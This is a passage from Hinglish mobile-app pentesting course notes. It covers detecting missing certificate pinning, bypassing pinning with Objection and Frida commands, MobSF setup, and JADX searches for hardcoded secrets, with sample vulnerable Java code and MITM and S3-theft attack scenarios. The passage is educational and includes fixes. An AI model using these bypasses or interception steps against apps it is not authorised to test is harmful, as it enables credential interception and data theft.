4.  **⏰ Kab/Kahan check karein? (When/Where?):** Burp Proxy setup (Topic 2.4) karne ke *turant baad*. Jaise hi aap Burp setup karke app kholte hain, agar aapko `HTTP History` mein app ka saara HTTPS traffic (e.g., `https://api.app.com`) saaf-saaf dikh raha hai, iska matlab app mein pinning **nahi hai**. Yeh developer ki galti hai.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap ek critical vulnerability ko "feature" samajh lenge. Agar app (jaise bank app) mein pinning nahi hai, toh yeh ek **P1 - Critical** bug hai, kyunki isse Man-in-the-Middle (MITM) attack ho sakta hai.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * **Normal HTTPS (No Pinning):**
        1.  App kehti hai: "Hello `api.google.com`, mujhe connect karna hai."
        2.  Burp (beech mein) kehta hai: "Hello App, main hi `api.google.com` hoon, yeh lo mera certificate (PortSwigger wala)."
        3.  App (Phone OS se): "Hey OS, kya yeh 'PortSwigger' certificate trusted hai?"
        4.  Phone OS: "Haan, user ne ise abhi-abhi install kiya tha. Trusted hai."
        5.  App: "OK." (Connection ban jaata hai. Attacker jeet gaya 🎉).
      * **Good HTTPS (With Pinning):**
        1.  App kehti hai: "Hello `api.google.com`, mujhe connect karna hai."
        2.  Burp (beech mein): "Hello App, main hi `api.google.com` hoon, yeh lo mera certificate (PortSwigger wala)."
        3.  App (Phone OS se): "Hey OS, kya yeh 'PortSwigger' certificate trusted hai?"
        4.  Phone OS: "Haan, trusted hai."
        5.  App: "Ruko\! Main check karti hoon... Mere code mein likha hai ki asli certificate ka 'fingerprint' toh `ABCDEF` hai, lekin yeh 'PortSwigger' wale ka fingerprint `123456` hai. **Yeh jaali hai\! Attack\!**"
        6.  App connection ko **reject** kar deti hai. (Attacker haar gaya ❌).

7.  **💻 Code example / Command Example (Vulnerable Code - No Pinning):**

      * **Vulnerable Java/Kotlin Code (Default, No Pinning):**

        ```java
        // Yeh default code hai jo har koi use karta hai. Ismein pinning nahi hai.
        URL url = new URL("https://api.vulnerable.com/login");
        HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        // ... (Connection ho jaayega, Burp traffic dekhega)
        ```

      * **Secure Java/Kotlin Code (With Pinning - using OkHttp):**

        ```java
        // Yeh secure code hai (using OkHttp library)
        String hostname = "api.secure.com";
        CertificatePinner certificatePinner = new CertificatePinner.Builder()
            .add(hostname, "sha256/ABCDEF123456GHIJKL...") // Asli server ka SHA256 pin
            .build();
            
        OkHttpClient client = new OkHttpClient.Builder()
            .certificatePinner(certificatePinner)
            .build();
            
        Request request = new Request.Builder()
            .url("https://api.secure.com/login")
            .build();
            
        Response response = client.newCall(request).execute(); // Agar MITM hua, toh yahan exception aa jaayega
        ```

      * **✍️ Line-by-line explanation (Secure Code):**

          * `.add(hostname, "sha256/ABCDEF...")`: Hum app ko bol rahe hain ki `api.secure.com` ke liye, certificate ka SHA256 hash *sirf* `ABCDEF...` hi hona chahiye.
          * `.certificatePinner(certificatePinner)`: Hum client (app) ko bol rahe hain ki is pinning rule ko laagoo karo.
          * `client.newCall(request).execute()`: Jab app connect karne ki koshish karegi aur Burp apna jaali cert dega, toh Burp ke cert ka hash `ABCDEF...` se match nahi karega, aur app `SSLPeerUnverifiedException` dekar connection tod degi.

      * **🚀 Quick run expected output (Pentester View):**

          * **Lack of Pinning (Vulnerable):** App normal chalegi. Burp ki `HTTP History` mein saara HTTPS traffic (passwords, tokens) saaf dikhega.
          * **Pinning Enabled (Secure):** App chalegi hi nahi. Login fail ho jaayega. App "Network Error", "Connection Failed" jaisa error degi. Burp ki `HTTP History` mein kuch nahi aayega (ya sirf `CONNECT` request dikhegi).

8.  **🐞 Common beginner mistakes (Emphasis):**

      * App na chalne par (network error) ghabra jaana. **Yeh ghabrane ki nahi, khush hone ki baat hai\!** 🥳 Iska matlab hai app secure hai (pinning enabled hai). Ab aapka *asli* kaam shuru hota hai (use bypass karna - next topic).
      * Burp ka certificate hi install na karna aur fir sochna ki app mein pinning hai. (Agar cert install nahi hai, toh OS hi connection reject kar dega, app tak baat hi nahi pahuchegi). Pehle cert setup (Topic 2.4) poora karo.
      * HTTP traffic ko "Lack of Pinning" report karna. Pinning *sirf* HTTPS ke liye hoti hai. Agar app HTTP (plain text) use kar rahi hai, toh woh `NSAllowsArbitraryLoads` (iOS) ya "Cleartext Traffic Enabled" (Android) bug hai, jo pinning se bhi bada (aur alag) bug hai.

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack") (Emphasis):**

      * **❓ Beginner's Core Question:** "Agar app HTTPS use kar rahi hai, toh woh safe hai na? Pinning kyun?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester ek public Wi-Fi (jaise Starbucks) par baithta hai.
        2.  Woh apne laptop par Burp Suite chalaata hai aur ek "Evil Access Point" (fake Wi-Fi) banata hai.
        3.  Victim uss fake "Free Starbucks Wi-Fi" se connect karta hai.
        4.  Attacker (pentester) us victim ke saare traffic ko apne Burp se route kar deta hai (transparent proxy).
        5.  Victim apni 'Vulnerable Bank App' (jismein pinning nahi hai) kholta hai.
        6.  Kyunki app mein pinning nahi hai, woh attacker ke (Burp ke) jaali certificate ko accept kar leti hai.
        7.  Victim apna username/password daalta hai.
        8.  Pentester (attacker) ko Burp ki history mein victim ka username aur password **plain text** mein mil jaata hai. 💥
      * **😈 Real Attack Scenario (Criminal Perspective):** Same as above. Criminal aapke saare bank details, social media passwords, credit card numbers chura sakta hai.
      * **💰 Real Bug Bounty Example:** Koi bhi app (jo sensitive data handle karti hai) agar usmein SSL pinning nahi hai, toh yeh ek valid P1/P2 bug report hai. Jaise: "Lack of SSL Pinning allows MITM attack to steal user credentials."

10. **✅ Quick checklist / Mitigation:**

      * **Test:** Burp ka certificate (system-level) install karke app chalao.
      * **Result 1 (Vulnerable):** Agar traffic dikhta hai -\> Report "Lack of Certificate Pinning".
      * **Result 2 (Secure):** Agar traffic nahi dikhta (Network Error) -\> Khush ho jaao, ab hum "Certificate Pinning Bypass" (Next topic) try karenge.
      * **Fix:** Developers ko `OkHttp` (Android) ya `AlamoFire` (iOS) jaisi modern libraries use karni chahiye aur unmein certificate pinning (hash ya public key) implement karni chahiye.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * DVIA (iOS) ya DIVA (Android) app chalao.
      * Burp se uska traffic intercept karo. Aap dekhenge ki aapko saara traffic dikh raha hai. Yeh "Lack of Certificate Pinning" hai.

12. **📚 Further reading / commands / tools:**

      * **OWASP:** [Certificate Pinning](https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning)
      * **Libraries:** `OkHttp` (Android), `AlamoFire` (iOS).

-----

## 2.6: Bypass: Certificate Pinning (Multi-platform)

1.  **🎯 Title / Short Summary:** Pinning ka Taala Todna 🔑. Jab app (secure) hamara Burp traffic rok de, toh uss security ko (Frida/Objection se) kaise todein.

2.  **🤔 Kya hai? (What?):** Yeh woh hacking technique hai jisse hum app ke runtime (chalte waqt) uske code ko modify kar dete hain taaki woh certificate pinning check *kar hi na paaye*. Hum app ko dhokha dete hain ki "sab theek hai, Burp ka certificate hi asli hai."

3.  **💡 Kyu important hai? (Why?):** Agar hum pinning bypass nahi kar paaye, toh hum us app ka traffic *kabhi* nahi dekh payenge. Aur agar traffic nahi dikha, toh hum backend API (jahan asli bugs hote hain) ko test *kar hi nahi sakte*. Isliye, yeh ek pentester ke liye sabse zaroori skills mein se ek hai.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** Jab (Topic 2.5 mein) aapko app mein "Network Error" aaye aur Burp mein traffic na dikhe. Iska matlab pinning enabled hai aur ab use bypass karne ka time hai.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap client ko bolenge, "App bahut secure hai, main test nahi kar sakta." Client aapko fire kar dega. 😂 Asli pentester wohi hai jo is deewaar ko tod kar andar jaa sake.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown (3 Main Ways):**

      * **Method 1: Objection (Sabse Aasan) 🥇**
          * Objection (jo Frida ka wrapper hai) mein pehle se bane-banaye scripts hote hain.
          * Aap app ko Objection se start karte ho aur `android sslpinning disable` (ya `ios sslpinning disable`) command chalaate ho.
          * Yeh common pinning libraries (jaise OkHttp, TrustKit) ko automatically hook karke disable kar deta hai.
          * **Kab Fail hota hai:** Agar app ne koi custom/unknown pinning code likha hai.
      * **Method 2: Frida (Universal Tareeka) 🥈**
          * Yeh 'surgical strike' hai. Objection fail hone par, hum Frida ki custom script use karte hain.
          * Internet par (Frida CodeShare) par bahut saari ready-made pinning bypass scripts (e.g., `frida-multiple-unpinning`) milti hain.
          * Hum app ko script ke saath run karte hain (`frida -U -f <package> -l <script.js>`).
          * Yeh script app ki memory mein jaakar pinning-related functions (jaise `check`, `verify`) ko 'hook' (kabza) kar leti hai aur unhe hamesha `true` (sab theek hai) return karwa deti hai.
          * **Kab Fail hota hai:** Kabhi nahi (agar script sahi hai). Agar ready-made script fail ho, toh humein app ko reverse karke (Module 3) custom pinning function dhoondhna padta hai aur uske liye apni script likhni padti hai (Advanced).
      * **Method 3: Smali Patching / Re-packaging (Purana Tareeka) 🥉**
          * Yeh static tareeka hai. Hum app ko `apktool` se decode karte hain (Topic 2.1).
          * Hum code (`.smali` files) mein pinning waala function dhoondhte hain (jaise `checkCertificatePinning`).
          * Hum us function ka code badal dete hain (e.g., use `return true` kar dete hain).
          * Hum app ko `apktool b` se waapas 'build' (re-package) karte hain.
          * Hum use 'sign' karte hain (ApkSigner se) aur install karte hain.
          * **Kab Fail hota hai:** Agar app mein anti-tampering (app re-packaging) check ho. Yeh lamba aur mushkil tareeka hai, Frida/Objection best hain.

7.  **💻 Code example / Command Example (Objection & Frida):**

      * **Objection (The Easy Way):**

        ```bash
        # 1. (Phone rooted/jailbroken, Frida server chal raha hai)
        # 2. App ko explore mode mein start karo
        objection -g com.vulnerable.app explore

        # 3. Objection ke prompt (com.vulnerable.app #) par...
        # Android ke liye:
        android sslpinning disable

        # iOS ke liye:
        ios sslpinning disable
        ```

      * **✍️ Line-by-line explanation:**

          * `objection -g com.vulnerable.app explore`: App (`com.vulnerable.app`) ko start karta hai aur Objection ka hook attach kar deta hai.
          * `android sslpinning disable`: Objection ko bolta hai ki common Android pinning methods ko disable kar do.
          * `ios sslpinning disable`: Objection ko bolta hai ki common iOS pinning methods ko disable kar do.

      * **🚀 Quick run expected output:** Objection `(agent) SSL Pinning disabled...` jaisa message dega. Ab aap app ko use karo, "Network Error" chala jaayega aur Burp mein traffic aane lagega\!

      * 
    <!-- end list -->

    ```
    -----
    ```

      * **Frida (The Universal Way):**

        ```bash
        # 1. (Phone rooted/jailbroken, Frida server chal raha hai)
        # 2. Ek famous multi-purpose script download karo (e.g., frida-multiple-unpinning.js)
        # ... maan lo script ka naam 'bypass.js' hai

        # 3. Frida se app ko spawn (start) karo aur script inject kar do
        frida -U -f com.vulnerable.app -l bypass.js --no-pause
        ```

      * **✍️ Line-by-line explanation:**

          * `frida -U`: USB se jude device se connect karo.
          * `-f com.vulnerable.app`: Is package ko 'spawn' karo (thanda start karo). (Agar app pehle se chal rahi hai, toh `-f` ki jagah `-n "App Name"` use kar sakte ho).
          * `-l bypass.js`: `bypass.js` script ko app ki memory mein inject kar do.
          * `--no-pause`: App ko start hote hi 'resume' (run) kar do (pause mat karo).

      * **🚀 Quick run expected output:** Script ke messages (jaise "Bypassed OkHttp...", "Bypassed TrustKit...") terminal par dikhenge. App chal jaayegi aur Burp mein traffic aane lagega.

8.  **🐞 Common beginner mistakes:**

      * **Objection/Frida chalana, lekin Burp ka certificate install na karna.** Bypass tools app ko Burp ke *jaali* certificate par "trust" karwaate hain. Agar phone mein woh certificate hi nahi hoga, toh OS hi connection tod dega. Step 1 (Topic 2.4) hamesha zaroori hai.
      * **App ko pehle kholna, fir Objection se attach karna.** Objection ka `explore` command (jo `-g` se chalta hai) app ko *start* karta hai. App ke start hote hi pinning check ho jaata hai. Hamesha `objection -g <package> explore` se hi app ko start karo, fir bypass command chalao, fir app ko use karo.
      * **Frida mein `-f` (spawn) use karna jab app pehle se chal rahi ho.** Agar app chal rahi hai, toh `-n "App Name"` (attach) use karo. `-f` hamesha app ko maar kar naya start karta hai.

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack"):**

      * **❓ Beginner's Core Question:** "App ne pinning daal di, matlab main haar gaya?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester ek high-security Banking App (jo pinning use karti hai) ko test karne baithta hai.
        2.  Woh Burp setup karta hai. App kholte hi "Network Error". Woh samajh jaata hai ki pinning enabled hai.
        3.  Woh `objection -g com.bank.app explore` chalata hai, fir `android sslpinning disable`.
        4.  App *abhi bhi* "Network Error" de rahi hai. (Matlab Objection fail ho gaya; unhone custom code likha hai).
        5.  Pentester `frida-multiple-unpinning.js` script (internet se) use karta hai: `frida -U -f com.bank.app -l bypass.js`.
        6.  Boom\! 💥 App chal jaati hai. Traffic Burp mein aane lagta hai.
        7.  Ab Pentester Burp mein login request (`POST /api/login`) ko 'Repeater' mein bhejta hai aur IDOR, BOLA, SQLi (Module 6) ke liye test karna shuru karta hai.
      * **💰 Real Bug Bounty Example:** Aap "SSL Pinning Bypass" ko bug report *nahi* kar sakte (kyunki yeh aapki skill hai, app ki kamzori nahi). Lekin, is bypass ko *karne ke baad* jo aap bug dhoondhte hain (jaise "IDOR in /api/v2/get\_user\_details"), uske liye aapko bounty milti hai. Yeh bypass karna "sone ki tijori" ko kholne jaisa hai; bounty tijori ke *andar* ke saamaan (API bugs) ki milti hai.

10. **✅ Quick checklist / Mitigation:**

      * **Step 1:** Burp Cert (System Level) install hai ya nahi? (Hona chahiye).
      * **Step 2:** `Objection` try karo (`android sslpinning disable`).
      * **Step 3:** Agar fail ho, toh `Frida` (universal scripts) try karo.
      * **Step 4:** Agar fail ho, toh app ko reverse (Module 3) karke custom script likho (Advanced).

11. **🏋️‍♀️ Practice exercise (Lab):**

      * Internet se "SSL Pinning Demo" app (GitHub par bahut hain) download karo.
      * Pehle use Burp se chalao (fail hoga).
      * Fir use `Objection` se bypass karne ki koshish karo.
      * Fir use `Frida` se bypass karne ki koshish karo.

12. **📚 Further reading / commands / tools:**

      * **Tools:** **Frida**, **Objection**.
      * **Frida Scripts:** `https://codeshare.frida.re/` (search for 'ssl', 'pinning', 'unpin').
      * **Commands:** `objection explore`, `frida -U -f <pkg> -l <script> --no-pause`.

-----

Module 2 complete\! 🏁 Humne app ka X-Ray (Manifest/Plist) karna seekh liya hai, network traffic (Burp) setup kar liya hai, aur sabse badi deewaar (SSL Pinning) ko todna bhi seekh liya hai.

Ab humara rasta saaf hai. Jab aap ready hon, toh batana. Hum **Module 3: Static Analysis & Reversing** shuru karenge, jahan hum app ke code (DEX, SO, Swift) ke andar ghus kar hardcoded passwords aur secrets dhoondhenge\! 🕵️‍♂️🔑

=============================================================

Chalo bhai, shuru karte hain aapke Complete Mobile Pentester notes ka Module 3\! 🚀

Module 2 mein humne app ki 'kundli' (Manifest/Plist) padhi aur uska traffic (Burp) roka. Ab hum asli detective 🕵️‍♂️ banenge. Is module mein hum app ke code ke *andar* ghusenge. Hum app ko reverse engineer karke uske Java, Swift, aur C++ code ko padhna seekhenge taaki hum usmein chhupe hue raaz (hardcoded passwords, API keys 🔑) dhoondh sakein.

-----

## 3.1: Static vs. Dynamic Analysis (MobSF)

1.  **🎯 Title / Short Summary:** Static (Kitab padhna) 📖 vs. Dynamic (Chala kar dekhna) 🏃‍♂️. App ko test karne ke do mool tareeke aur MobSF (hamara automatic scanner) kaise use karein.
2.  **🤔 Kya hai? (What?):**
      * **Static Analysis:** App ko bina run (execute) kiye, uske code, files, aur blueprint (Manifest/Plist) ko padhna.
      * **Dynamic Analysis:** App ko ek live (rooted/jailbroken) phone par chala kar, uske behavior (network, memory, file usage) ko real-time mein check karna.
3.  **💡 Kyu important hai? (Why?):** Sirf ek tareeke par bharosa karna aapko andha bana deta hai.
      * **Static** se hardcoded keys milti hain (jo runtime par nahi dikhti).
      * **Dynamic** se API logic flaws (IDOR) milte hain (jo code mein nahi dikhte).
      * Ek complete pentester hamesha **dono** karta hai.
4.  **⏰ Kab/Kahan check karein? (When/Where?):** Yeh foundational hai.
      * **Static (Step 1):** Test shuru hote hi, `.apk` / `.ipa` file milte hi. Hum `JADX`, `Ghidra`, aur `MobSF` se blueprint dekhte hain.
      * **Dynamic (Step 2):** Static analysis ke baad, jab hum app ko phone par install karke `Burp` aur `Frida` se chalaate hain.
      * Galti: Sirf ek par depend karna.
5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):**
      * **Sirf Static kiya:** Aapko hardcoded "test\_password" milega, lekin aapko pata nahi chalega ki app runtime par server se "admin" ka password bhi la rahi hai. Aap API logic (IDOR, BOLA) ko 100% miss kar denge.
      * **Sirf Dynamic kiya:** Aapko Burp mein `POST /login` dikhega, lekin aapko pata nahi chalega ki app ke code (Static) mein `S3_SECRET_KEY` hardcoded thi jisse aap poora database hi download kar sakte thay.

-----

### ⭐ Comparison: Static Analysis vs. Dynamic Analysis

| Pehlu (Aspect) | 📖 Static Analysis (Code Padhna) | 🏃‍♂️ Dynamic Analysis (Chala kar Dekhna) |
| :--- | :--- | :--- |
| **2. Kya hai?** | App ke blueprint (code, manifest, plists) ko padhna, bina use chalaye. | Chalti hui app ke behavior (network, memory, UI) ko real-time mein test karna. |
| **3. Kyu important?** (Attacker View) | App mein "design" ki galtiyaan (jaise hardcoded keys, exported components) dhoondhne ke liye. | App ke "runtime" logic ki galtiyaan (jaise IDOR, SSL Pinning bypass, Root detection) dhoondhne ke liye. |
| **4. Kab/Kahan?** (Pentester Focus) | **Pehle.** JADX, Ghidra, MobSF mein. | **Baad mein.** Burp, Frida, Objection, ADB, Drozer mein. |
| **5. Agar nahi samjha?** (Consequences) | Aap app ke code mein chhupe secrets (API keys, passwords) ko miss kar denge. | Aap app ke server-side logic (jahan 90% bugs hote hain) ko miss kar denge. |
| **8. Common Mistakes** | Yeh sochna ki code obfuscated (R8/Proguard) hai toh kuch nahi milega. (Galat\! Strings fir bhi mil jaati hain). | **Pinning bypass na kar paana.** Agar aap (M2.6) pinning bypass nahi kar paaye, toh aap dynamic analysis (traffic) kar hi nahi sakte. |
| **9. Real-World Scenario** | **Pentester:** `JADX` kholta hai, "apiKey" search karta hai, aur use AWS S3 ki key milti hai. **(Static Bug)** | **Pentester:** `Burp` mein profile page ki request (`GET /api/profile/123`) dekhta hai, `123` ko `124` karta hai, aur doosre user ka profile dekh leta hai. **(Dynamic Bug - IDOR)** |
| **11. Key Questions (FAQs)** | *Q: Kaun sa behtar hai?*<br>A: Dono zaroori hain. Static, map deta hai. Dynamic, us map par chal kar gold dhoondhta hai. | *Q: MobSF kya hai?*<br>A: Dono ka Baap\! 🤖 Yeh ek automatic tool hai jo APK/IPA leta hai aur 80% common static galtiyaan (Manifest, permissions, hardcoded keys) 5 minute mein dhoondh deta hai. |

-----

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown (MobSF):**

      * **MobSF (Mobile Security Framework):** Yeh ek open-source, all-in-one tool hai.
      * Aap ise apne PC par (Docker ya Python se) run karte hain, yeh ek local web server (`localhost:8000`) banata hai.
      * Aap uske web UI par `.apk` ya `.ipa` file upload karte hain.
      * MobSF file ko decode (apktool) aur decompile (JADX) karta hai.
      * Yeh `AndroidManifest.xml` / `Info.plist` ko parse karta hai.
      * Yeh code mein common "bad strings" (jaise "password", "apiKey", "http://") dhoondhta hai.
      * Yeh permissions, exported components, aur weak crypto ki list banata hai.
      * **Fayda:** Ek beginner ko 5 minute mein "kahan-kahan dekhna hai" ki poori list mil jaati hai.
      * **Nuksaan:** Yeh 'false positives' (jo bug nahi hai, use bhi bug batata hai) de sakta hai aur logic bugs (IDOR) nahi pakad sakta. Hamesha *manual validation* (JADX/Burp se) zaroori hai.

7.  **💻 Code example / Command Example (MobSF Setup):**

      * (MobSF ek UI tool hai, lekin yeh usse setup karne ke commands hain)

    <!-- end list -->

    ```bash
    # 1. GitHub se download karo
    git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git

    # 2. Folder mein jaao
    cd Mobile-Security-Framework-MobSF

    # 3. Setup script chalao (yeh saari dependencies install kar degi)
    ./setup.sh 

    # 4. Server run karo
    ./run.sh 127.0.0.1:8000
    ```

      * **✍️ Line-by-line explanation:**
          * `git clone ...`: MobSF ka poora code GitHub se download karta hai.
          * `cd ...`: Folder ke andar jaata hai.
          * `./setup.sh`: Linux/Mac par setup script chalata hai (Windows ke liye `setup.bat` hai). Yeh `pip` se zaroori Python libraries install karta hai.
          * `./run.sh ...`: MobSF ka web server `127.0.0.1` (aapka local PC) par port `8000` par start karta hai.
      * **🚀 Quick run expected output:**
        Terminal par server logs dikhenge. Aap apne browser mein `http://127.0.0.1:8000` kholenge aur aapko MobSF ka dashboard dikhega, jahan aap APK/IPA upload kar sakte hain.

8.  **✅ Quick checklist / Mitigation:**

      * **Static:** Hamesha `JADX` (Android) ya `Ghidra` (iOS) se code padho.
      * **Dynamic:** Hamesha `Burp` (traffic) aur `Frida` (runtime) se app chalao.
      * **Automation:** Hamesha test shuru karne se pehle `MobSF` mein file daal kar 5-minute ka automatic checkup zaroor karo.

9.  **🏋️‍♀️ Practice exercise (Lab):**

      * DIVA (Android) app ka APK download karo.
      * Use apne local MobSF scanner par upload karo aur uski generate ki hui PDF report ko padho. Dekho woh kya-kya vulnerabilities dhoondhta hai.

10. **📚 Further reading / commands / tools:**

      * **Static Tools:** `MobSF`, `JADX-GUI`, `Ghidra`, `Apktool`.
      * **Dynamic Tools:** `Burp Suite`, `Frida`, `Objection`, `ADB`, `Drozer`.

-----

## 3.2: Android Reversing: Apktool, JADX, Hardcoded Credentials

1.  **🎯 Title / Short Summary:** App ka Code Padhna (JADX) aur Secret Keys Churana 🔑.

2.  **🤔 Kya hai? (What?):** Yeh woh process hai jisse hum Android app ke compiled code (`classes.dex`) ko waapas human-readable Java code mein badalte hain (`JADX` se) aur fir us code ko "hardcoded" (seedhe likhe hue) passwords, API keys, ya secrets ke liye search karte hain.

3.  **💡 Kyu important hai? (Why?):** Developers aksar jaldi mein (ya galti se) sensitive data (jaise test password, server ki API key) code mein hi chhod dete hain. Yeh app ki chaabi ko darwaaze ke neeche 'doormat' ke neeche chhipane jaisa hai. Attacker sabse pehle wahin dekhta hai.

4.  **⏰ Kab/Kahan check karein? (When/Where?):** Yeh **Static Analysis (Step 1)** hai. MobSF report milne ke baad, hum manually JADX-GUI tool mein APK ko khol kar "Search -\> Text" (ya `Ctrl+Shift+F`) ka istemaal karte hain. Yeh galti (hardcoding) developer ki hoti hai.

5.  **❌ Agar check nahi kiya to kya hoga? (If not checked / consequences):** Aap sabse aasan aur sabse critical bugs miss kar denge. Ek hardcoded AWS key (jo JADX mein 2 minute mein mil jaati hai) se attacker poora user database (S3 bucket) download kar sakta hai ya poora infrastructure band kar sakta hai.

6.  **🧑‍🏫 Step-by-step explanation / Concept breakdown:**

      * `Apktool`: Yeh APK ko 'disassemble' karta hai. Yeh `classes.dex` ko `Smali` code (jo Assembly jaisa hota hai) mein badalta hai. Hum `Apktool` ko code *padhne* ke liye nahi, balki code *badalne* (patching - Topic 3.5) ke liye use karte hain.
      * `JADX-GUI`: Yeh APK ko 'decompile' karta hai. Yeh `classes.dex` ko seedha readable **Java code** mein badalta hai. Beginners ke liye yeh best hai.
      * **The Hacking Process (JADX):**
        1.  `jadx-gui victim_app.apk` command chalao.
        2.  Tool mein app ka poora code structure (packages, classes) dikh jaayega.
        3.  `Search > Text Search` (ya `Ctrl+Shift+F`) kholo.
        4.  Magic keywords search karo: `password`, `secret`, `apiKey`, `token`, `S3_KEY`, `aws_`, `http://` (insecure links), `admin@123`.
        5.  Har result par click karke dekho ki woh string kahan use ho rahi hai.

7.  **💻 Code example / Command Example:**

      * **Command (JADX-GUI ko kholna):**

        ```bash
        # (Aapko JADX ke 'bin' folder mein hona chahiye ya use PATH mein add karna hoga)
        jadx-gui /path/to/vulnerable_app.apk
        ```

      * **Vulnerable Java Code (JADX mein aisa dikhega):**

        ```java
        // JADX is code ko 'ApiClient.java' class mein dikhayega

        public class ApiClient {
            
            // 🐞 Khatra 1: Server ki API key hardcoded hai
            private String apiKey = "sk_live_123abc456def_THIS_IS_A_SECRET_KEY";
            
            // 🐞 Khatra 2: AWS S3 bucket ka password
            private String s3_secret = "AwsSuperSecretPassword123!@#";
            
            public void login(String user, String pass) {
                
                // 🐞 Khatra 3: Ek master password (shayad test ke liye)
                if (pass.equals("admin@123")) { 
                    // ... login successful
                } else {
                    // ... server se check karo
                }
            }
        }
        ```

      * **✍️ Line-by-line explanation (Vulnerable Code):**

          * `apiKey = "sk_live_..."`: 🐞 **Critical\!** Yeh ek Stripe/AWS/Firebase ki "secret key" lag rahi hai. Agar yeh leak hui, toh attacker poora backend control kar sakta hai (paise chori karna, data delete karna).
          * `s3_secret = "..."`: 🐞 **Critical\!** Yeh AWS S3 (storage) ka secret hai. Attacker isse users ki saari private files (photos, documents) download kar sakta hai.
          * `pass.equals("admin@123")`: 🐞 **High\!** Yeh ek client-side master password hai. Attacker (pentester) is password se `admin` user bankar login kar sakta hai.

      * **Secure Code (Kaisa hona chahiye tha):**

        ```java
        public class ApiClient {
            
            // Tareeka 1: Key ko 'build.gradle' file se lo
            private String apiKey = BuildConfig.API_KEY; 
            
            public void login(String user, String pass) {
                // Tareeka 2: Logic server par rakho, client par nahi
                // Client-side 'if' check HAMESHA galat hai
                sendLoginRequestToServer(user, pass);
            }
        }
        ```

      * **✍️ Line-by-line explanation (Secure Code):**

          * `BuildConfig.API_KEY`: Key ko code se hata kar `build.gradle` file (jo `.gitignore` mein hoti hai) mein rakha gaya hai. Yeh reversing se safe hai.
          * `sendLoginRequestToServer(...)`: Login ka 'if' check client par nahi, server par ho raha hai. Yeh sahi tareeka hai.

      * **🚀 Quick run expected output (JADX Command):**
        `jadx-gui` chalane se ek window khulegi jismein app ka poora decompiled Java code dikhega.

8.  **🐞 Common beginner mistakes (Emphasis):**

      * Sirf "password" search karna. Asli goldmine "key", "secret", "token", "auth" keywords mein hota hai.
      * **Base64/Obfuscated strings ko ignore karna.** Bahut baar keys aisi dikhti hain: `decrypt("S2...cE=")`. Yeh Base64 hai. Ise decode karke dekho. Har ajeeb dikhne waali string (khaas kar 20-40 characters waali) suspect hai.
      * Yeh sochna ki Proguard/R8 (obfuscation) se keys chhip jaati hain. **Galat\!** Proguard sirf class/function ke naam (`a.b.c`) badalta hai, `String` constants (jaise `"sk_live_..."`) ko *nahi* badalta.
      * `Apktool` (Smali) mein code padhne ki koshish karna. Beginners ke liye Smali (assembly) padhna bahut mushkil hai. Hamesha `JADX` (Java) se shuru karo.

9.  **🌍 Real-World Attack Scenario (The "How-To-Hack") (Emphasis):**

      * **❓ Beginner's Core Question:** "App toh phone pe hai, developer itni badi galti kaise kar sakta hai?"
      * **🕵️‍♂️ Pentesting Scenario (Ethical Hacker):**
        1.  Pentester ko `.apk` file milti hai.
        2.  Woh `jadx-gui app.apk` chalata hai.
        3.  `Ctrl+Shift+F` daba kar "apiKey" search karta hai.
        4.  Use `com.app.utils.Constants.java` file mein `String stripeKey = "sk_live_..."` mil jaati hai.
        5.  Woh is key ko check karta hai aur paata hai ki yeh 'live' (production) key hai.
        6.  Woh P1 (Critical) bug report file karta hai ki "Hardcoded Stripe Secret Key allows unauthorized payment access."
      * **😈 Real Attack Scenario (Criminal Perspective):** Attacker JADX se `s3_secret` (Khatra 2) nikaalta hai. Woh `aws-cli` tool (apne PC par) use karke us key se login karta hai aur company ke S3 bucket se saara user data (lakho users ke photos, IDs, documents) chori kar leta hai aur use black market par bech deta hai.
      * **💰 Real Bug Bounty / CVE Example:** **HackerOne Report \#82146 (Twitter Vine).** Vine ke Android app mein ek AWS S3 key hardcoded thi, jisse attacker Vine ke saare videos (private bhi) ko access kar sakta tha. Yeh ek simple JADX search se mila tha.

10. **✅ Quick checklist / Mitigation:**

      * JADX kholo, `Ctrl+Shift+F` (Text Search) karo.
      * Keywords: `key`, `secret`, `password`, `token`, `auth`, `bearer`, `http://`.
      * Har ajeeb Base64 string ko decode karke dekho.
      * **Fix:** Secrets *kabhi* code mein nahi hone chahiye. Unhe `build.gradle` (Android) se inject karo ya (sabse best) runtime par server se fetch karo.

11. **🏋️‍♀️ Practice exercise (Lab):**

      * DIVA app ko JADX-GUI mein kholo.
      * "Hardcoding Issues - 1 (Java)" challenge ko select karo aur uska "Access Key" code mein dhoondhne ki koshish karo. (Hint: Search for "secret").

12. **📚 Further reading / commands / tools:**

      * **Tools:** `JADX-GUI` (code padhne ke liye), `Apktool` (code badalne ke liye - M3.5).

-----

## 3.3: iOS Reversing: dumpdecrypted, Objective-C/Swift analysis

1.  **🎯 Title / Short Summary:** Apple ka Encrypted App Todna (dumpdecrypted) 🍏. Encrypted iOS app se code nikaalna.

2.  **🤔 Kya hai? (What?):** App Store se download ki hui har iOS app Apple ke FairPlay DRM se "encrypted" hoti hai. `dumpdecrypted` (ya naya `frida-ios-dump`) ek tool hai jo **jailbroken** device par chalti hui app ki memory se us "decrypted" binary ko "dump" (copy) kar leta hai.

3.  **💡 Kyu important hai? (Why?):** Ek encrypted app binary ko agar aap `Ghidra` (Topic 3.4) mein kholenge, toh aapko sirf kachra (garbage data) dikhega. Code ko reverse engineer karne ke liye, use decrypt karna **Step 0** hai. Bina iske, iOS reversing shuru hi nahi ho sakti.

